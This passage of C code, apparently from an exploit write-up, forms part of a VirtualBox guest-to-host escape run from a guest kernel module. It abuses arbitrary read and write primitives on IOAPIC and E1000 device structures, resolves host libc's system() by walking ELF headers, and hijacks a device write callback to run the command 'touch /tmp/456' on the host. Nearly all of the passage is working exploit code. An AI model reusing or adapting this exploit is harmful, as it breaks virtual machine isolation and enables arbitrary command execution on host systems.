size_t r0pDevIns = arb_read(inst, code, (sll)(paRing0 + 0x38 + 0x10)); // DeviceIOAPIC->pDevIns
// Overwrite DeviceIOAPIC->pfnWriteCallback into copy_from_user
arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x18), copy_from_user); // DeviceIOAPIC->pfnWriteCallback = copy_from_user
// Prepare the MMIO of IO APIC
uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);

// 64 bit arbitrary read in user space
static size_t __attribute__((optimize("O0"))) arb_read64_user(int *inst, char *code, size_t paRing0, uint8_t *inst2, size_t r0pDevIns, size_t addr) {
 // DeviceIOAPIC->pvUser ( 2nd arg ) = user space addr
 arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x8), addr);
 // trigger DeviceIOAPIC->pfnWriteCallback, which is now copy_from_user
 // it will execute copy_from_user(r0pDevIns, pvUser, offRegion)
 // which is now copy_from_user(r0pDevIns, addr, 8)
 // The content of addr (userspace address) will be copied into r0pDevIns
 // So we just read the content from r0pDevIns and return the value
 inst2[8] = 0; // offRegion ( 3rd arg ) = 8
 // Content will be copied into r0pDevIns, read it
 return arb_read(inst, code, (sll)(r0pDevIns));
}
1
2
3
4
size_t e1kMMIORead = arb_read(inst, code, (sll)(r0Map + 0x188)); // e1kMMIORead
size_t vboxdd_base = e1kMMIORead - 0xff970;
size_t got_ioctl = vboxdd_base + 0x211bf0; // ioctl@got.plt
size_t ioctl = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, got_ioctl);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
// get libc base
size_t libc_base = 0;
size_t cur_addr = ioctl & ~0xfff;
while (true) {
 size_t cur_data = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr);
 if ( ( cur_data & 0xffffffff ) == 0x464c457f) {
 libc_base = cur_addr;
 break;
 }
 cur_addr -= 0x1000;
}
// get libc program header
size_t libc_ph = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, libc_base + 0x20) + libc_base ;
cur_addr = libc_ph;
// get dynamic section
size_t libc_dynamic = 0;
while(true) {
 size_t type = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr) & 0xffffffff;
 size_t vaddr = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr + 0x10);
 if (type == 2) { // .dynamic
 libc_dynamic = libc_base + vaddr;
 break;
 }
 cur_addr += 0x38;
}
// get SYMTAB & STRTAB
size_t libc_symtab = 0;
size_t libc_strtab = 0;
cur_addr = libc_dynamic;
while(true) {
 size_t type = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr);
 size_t vaddr = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr + 8);
 if (type == 0) { // END OF DYNAMIC
 break;
 }
 if (type == 5) { // STRTAB
 libc_strtab = vaddr;
 }
 if (type == 6) { // SYMTAB
 libc_symtab = vaddr;
 }
 cur_addr += 0x10;
}
// scan for system
size_t system = 0;
char cur_str[256] = {};
cur_addr = libc_symtab + 0x18;
while(true) {
 memset(cur_str, 0, sizeof(cur_str));
 size_t st_name = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr) & 0xffffffff;
 size_t offset = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr + 0x8);
 arb_readString_user(inst, code, paRing0, inst2, r0pDevIns, libc_strtab + st_name, cur_str);
 if(!strcmp(cur_str, "system")) {
 system = libc_base + offset;
 break;
 }
 cur_addr += 0x18;
}
printk(KERN_INFO "vboxdd_base: %px\n", vboxdd_base);
printk(KERN_INFO "libc_base: %px\n", libc_base);
printk(KERN_INFO "libc_dynamic: %px\n", libc_dynamic);
printk(KERN_INFO "libc_strtab: %px\n", libc_strtab);
printk(KERN_INFO "libc_symtab: %px\n", libc_symtab);
printk(KERN_INFO "system: %px\n", system);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
// leak ring 3 DeviceE1000->pDevIns->pCritSectRoR3
size_t r3pDevIns = arb_read(inst, code, (sll)(r0Map + 0x178)); // ring 3 DeviceE1000->pDevIns
size_t pCritSectRoR3 = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, r3pDevIns + 0x28);
printk(KERN_INFO "pCritSectRoR3: %px\n", pCritSectRoR3);

// Pick a buffer to forge pDevIns
size_t fake_pDevIns = r0Map + 0x1c0;
size_t fake_pDevIns_r3 = r3Map + 0x1c0;
write_string(inst, code, (sll)(fake_pDevIns), "touch /tmp/456"); // fake_pDevIns points to cmd
arb_write(inst, code, (sll)(fake_pDevIns + 0x28), pCritSectRoR3); // fake_pDevIns->pCritSectRoR3

arb_write(inst, code, (sll)(r0Map + 0x178), fake_pDevIns_r3); // ring 3 DeviceE1000->pDevIns = our fake pDevIns
arb_write(inst, code, (sll)(r0Map + 0x180), system); // ring 3 DeviceE1000->pfnWriteCallback = system

// this is a R3 MMIO write ( return VINF_IOM_R3_MMIO_WRITE; in e1kRegWriteEECD when Ring0)
int* inst3 = ioremap(E1000_MMIO_BASE,0x1000);
inst3[0x10/4]=0;
```
